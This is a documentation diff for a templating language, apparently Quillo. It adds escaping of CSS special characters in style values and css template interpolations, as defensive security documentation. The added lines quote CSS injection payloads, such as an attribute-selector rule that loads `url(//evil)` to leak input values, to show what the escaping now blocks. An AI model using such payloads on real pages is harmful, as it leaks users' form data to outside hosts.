@@ -931,7 +931,10 @@ expressions go in `{...}`, and everything is escaped unless it is already HTML:
   a `<style>`'s text as markup *(since 0.7)*. A `<script>`'s values are JSON with `&` as
   `\u0026` for the same reason.
   Write it as `` css`...` ``: a template string (braces are plain text, `${...}` fills in
-  values) that editors highlight as CSS. `` sql`...` `` does the same for queries.
+  values) that editors highlight as CSS. Each `${...}` is a CSS value: its `{`, `}`, `;`
+  and `\` are written as CSS's escapes, so `` css`p { color: ${c} }` `` with
+  `c = "red} input[value^=a]{background:url(//evil)}"` adds no rule *(since 0.7)*.
+  `` sql`...` `` does the same for queries.
 - A component's or view's own CSS is `style` at the start of its body, before its markup:
 
   ```quillo
@@ -1332,7 +1335,11 @@ route GET / = <html><body><Counter start={5}/></body></html>
   `z-index`, `line-height`, `flex`, `font-weight`, `order`...) and custom properties:
   `{ fontSize: 12, opacity: 0.5, "--gap": 4 }` is `font-size: 12px; opacity: 0.5; --gap: 4`
   *(since 0.7: `12` was written bare, and the browser dropped it)*. `ms` starts a prefix as
-  `Webkit` and `Moz` do: `msFlex` is `-ms-flex`.
+  `Webkit` and `Moz` do: `msFlex` is `-ms-flex`. A value's `{`, `}`, `;` and `\` are
+  written as CSS's escapes (`\7b `, `\7d `, `\3b `, `\5c `), so a value from data is one value
+  and adds no declaration: `{ color: "red;background:url(//evil)" }` is one colour the
+  browser does not take. A key is a property's name (letters, digits, `-` and `_`) or a
+  custom property's; another key is left out *(since 0.7, FEEDBACK51.md, Q-668)*.
 - `class={...}` takes text, a map (the keys whose values are true) or a list (its texts,
   lists inside it flattened, `null`, `false`, `true` and `""` skipped, a map in it giving
   its true keys), as `clsx` does: `class={{ active: on, off: !on }}`, `class={["card", big
@@ -5199,9 +5206,11 @@ Safety built in:
   attribute would say is checked, so `href={markdown(u, { inline: true })}` too. So do
   the values an SVG `<set>` or `<animate>` gives another attribute (`to`, `from`, `by`,
   each of `values`), which may be an `href`.
-- CSS takes data as it is written, by design: `style={...}` is escaped like any
-  attribute and `<style>{x}</style>` has its `<` rewritten (`\3c `), so neither can end the
-  element, but what they say is CSS. CSS runs no script in today's browsers; data put
+- CSS takes data as it is written, but for what would end it: `style={...}` is escaped
+  like any attribute, a style map's values and css`...`'s `${...}` have `{ } ; \` written
+  as CSS's escapes (so a value adds no rule or declaration), and `<style>{x}</style>` has
+  its `<` rewritten (`\3c `), so none can end the element; within a value, what it says is
+  CSS. CSS runs no script in today's browsers; data put
   there can still restyle the page (cover it with an overlay,
   hide or move what is on it) and load URLs (`background: url(https://elsewhere/?...)`,
   `@import`), which tells another site that the page was viewed and can carry what the
